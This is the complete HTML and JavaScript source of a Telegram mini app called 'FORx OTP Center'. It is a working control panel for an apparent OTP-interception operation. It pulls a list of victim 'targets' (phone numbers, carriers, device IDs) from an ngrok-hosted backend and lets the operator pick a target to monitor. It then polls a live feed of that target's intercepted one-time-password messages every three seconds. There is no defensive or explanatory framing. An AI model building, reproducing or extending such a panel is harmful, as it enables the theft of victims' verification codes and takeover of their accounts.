<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FORx OTP Center</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background:#0a0a0a; color:#e0e0e0; font-family:sans-serif; margin:0; padding:15px; }
        .tabs { display:flex; gap:5px; margin-bottom:10px; }
        .tab { flex:1; padding:10px; background:#1e1e1e; text-align:center; border-radius:8px 8px 0 0; cursor:pointer; }
        .tab.active { background:#2ecc71; color:#000; }
        .panel { display:none; }
        .panel.active { display:block; }
        .card { background:#1e1e1e; border-radius:10px; padding:12px; margin:8px 0; display:flex; justify-content:space-between; align-items:center; }
        .btn { background:#2ecc71; color:#000; border:none; padding:8px 14px; border-radius:6px; font-weight:bold; cursor:pointer; }
        .btn.stop { background:#e74c3c; }
        #feed { height:350px; overflow-y:auto; background:#111; border-radius:8px; padding:8px; }
        .otp { background:#2c3e50; margin:5px 0; padding:8px; border-radius:5px; font-size:14px; }
        input, button { font-size:14px; }
    </style>
</head>
<body>
    <div class="tabs">
        <div class="tab active" onclick="switchTab('targets')">🎯 Targets</div>
        <div class="tab" onclick="switchTab('favourites')">⭐ Favourites</div>
        <div class="tab" onclick="switchTab('feed')">⚡ Live Feed</div>
    </div>

    <div id="targets-panel" class="panel active">
        <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()">
        <div id="targets-list"><p>Loading...</p></div>
    </div>
    <div id="favourites-panel" class="panel">
        <button onclick="loadFavourites()">🔄 Refresh</button>
        <div id="favourites-list"><p>Loading...</p></div>
    </div>
    <div id="feed-panel" class="panel">
        <div id="feed"><p>No OTPs yet...</p></div>
    </div>

    <script>
        // ========== CONFIG ==========
        const API = 'https://limit-crispness-uncork.ngrok-free.dev';   // apna ngrok URL (bina slash)
        const tg = Telegram.WebApp;
        tg.ready();

        // 1. Try Telegram initData, fallback to URL parameter
        let userId = tg.initDataUnsafe?.user?.id || null;
        if (!userId) {
            const params = new URLSearchParams(window.location.search);
            userId = params.get('user_id');
        }

        if (!userId) {
            document.body.innerHTML = '<p style="color:red;">❌ Could not get user ID. Please open via bot.</p>';
            throw new Error('No user ID');
        }

        let allTargets = [];
        let monitorActive = false;
        let pollTimer = null;
        let lastOtpTs = 0;

        console.log('Mini app started, userId:', userId);
        console.log('API base:', API);

        // Common header to skip ngrok warning
        const HEADERS = {
            'ngrok-skip-browser-warning': 'true',
            'Content-Type': 'application/json'
        };

        // ----- Tab switching -----
        window.switchTab = function(tab) {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.getElementById(tab+'-panel').classList.add('active');
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            if (tab === 'targets') loadTargets();
            if (tab === 'favourites') loadFavourites();
        };

        // ----- Targets -----
        async function loadTargets() {
            try {
                console.log('Fetching targets...');
                let res = await fetch(`${API}/api/targets`, { headers: HEADERS });
                console.log('Response status:', res.status);
                if (!res.ok) throw new Error('HTTP ' + res.status);
                allTargets = await res.json();
                console.log('Targets loaded:', allTargets.length);
                renderTargets(allTargets);
            } catch(e) {
                console.error('Load targets error:', e);
                document.getElementById('targets-list').innerHTML = `<p style="color:red;">❌ Failed to load targets: ${e.message}</p>`;
            }
        }

        function renderTargets(targets) {
            let html = '';
            if (targets.length === 0) {
                html = '<p>No online targets. Scanner may be warming up.</p>';
            } else {
                targets.forEach(t => {
                    let carrierInfo = t.carrier1 !== 'Unknown' ? ` (${t.carrier1})` : '';
                    html += `<div class="card">
                        <div><b>${t.phone1}</b>${carrierInfo}<br><small>${t.model} | DB-${t.db_index}</small></div>
                        <button class="btn" onclick="startMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}')">▶️</button>
                        <button class="btn" style="background:#f39c12;" onclick="addFavourite('${t.did}', '${t.phone1}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}', '${t.model}', ${t.db_index})">⭐</button>
                    </div>`;
                });
            }
            document.getElementById('targets-list').innerHTML = html;
        }

        window.filterTargets = function() {
            let query = document.getElementById('search').value.toLowerCase();
            let filtered = allTargets.filter(t => 
                t.phone1.includes(query) || (t.phone2 && t.phone2.includes(query))
            );
            renderTargets(filtered);
        };

        // ----- Monitoring -----
        window.startMonitor = async function(did, dbIndex, phone1, model, phone2, car1, car2) {
            if (monitorActive) {
                await fetch(`${API}/api/monitor`, {
                    method: 'DELETE',
                    headers: HEADERS,
                    body: JSON.stringify({user_id: userId})
                });
            }
            await fetch(`${API}/api/monitor`, {
                method: 'POST',
                headers: HEADERS,
                body: JSON.stringify({
                    user_id: userId,
                    did: did,
                    db_index: dbIndex,
                    phone1: phone1,
                    model: model,
                    phone2: phone2,
                    carrier1: car1,
                    carrier2: car2
                })
            });
            monitorActive = true;
            tg.showAlert(`Monitoring ${phone1}`);
            if (!pollTimer) {
                pollOTP();
                pollTimer = setInterval(pollOTP, 3000);
            }
        };

        // ----- OTP Polling -----
        async function pollOTP() {
            try {
                let res = await fetch(`${API}/api/otp/${userId}?since=${lastOtpTs}`, { headers: HEADERS });
                if (!res.ok) return;
                let msgs = await res.json();
                if (msgs.length) {
                    let feed = document.getElementById('feed');
                    msgs.forEach(m => {
                        feed.innerHTML += `<div class="otp">${m.text}</div>`;
                        lastOtpTs = m.ts || lastOtpTs;
                    });
                    feed.scrollTop = feed.scrollHeight;
                }
            } catch(e) { console.error('OTP poll error:', e); }
        }

        // ----- Favourites -----
        async function loadFavourites() {
            try {
                let res = await fetch(`${API}/api/favourites/${userId}`, { headers: HEADERS });
                if (!res.ok) throw new Error('Failed');
                let favs = await res.json();
                let html = '';
                if (favs.length === 0) html = '<p>No favourites.</p>';
                else {
                    favs.forEach(f => {
                        html += `<div class="card">
                            <div><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
                            <button class="btn" onclick="startMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️</button>
                            <button class="btn stop" onclick="removeFavourite('${f.did}')">🗑️</button>
                        </div>`;
                    });
                }
                document.getElementById('favourites-list').innerHTML = html;
            } catch(e) {
                document.getElementById('favourites-list').innerHTML = `<p style="color:red;">Error loading favourites.</p>`;
            }
        }

        window.addFavourite = async function(did, phone1, phone2, car1, car2, model, dbIndex) {
            await fetch(`${API}/api/favourites/${userId}`, {
                method: 'POST',
                headers: HEADERS,
                body: JSON.stringify({ did, phone1, phone2, carrier1: car1, carrier2: car2, model, db_index: dbIndex })
            });
            tg.showAlert('Added to favourites');
        };

        window.removeFavourite = async function(did) {
            await fetch(`${API}/api/favourites/${userId}`, {
                method: 'DELETE',
                headers: HEADERS,
                body: JSON.stringify({ did })
            });
            loadFavourites();
        };

        // Initial load
        loadTargets();
        setInterval(loadTargets, 30000);
    </script>
</body>
</html>
